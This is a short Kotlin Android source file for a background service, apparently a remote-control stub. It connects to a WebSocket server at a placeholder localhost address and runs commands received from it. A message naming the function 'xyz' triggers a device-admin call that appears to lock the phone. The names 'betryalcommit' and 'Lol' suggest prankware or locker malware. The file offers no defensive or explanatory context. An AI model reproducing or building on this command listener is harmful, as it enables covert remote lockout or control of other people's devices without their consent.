package com.example.betryalcommit

import android.app.Service
import android.content.Intent
import android.os.IBinder
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject

class Lol: Service() {
    private val serverUrl = "ws://localhost:3000"
    private lateinit var webSocket: WebSocket

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()

        val client = OkHttpClient()
        val request = Request.Builder().url(serverUrl).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                executeFunction(text)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            }
        })
    }

    private fun executeFunction(message: String) {
        val jsonObject = JSONObject(message)
        val functionName = jsonObject.getString("functionName")
        val payload = jsonObject.getString("message")

        when (functionName) {
            "xyz" -> {
                AdminAct.lockdev(applicationContext)
                            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        webSocket.close(1000, null)
    }
}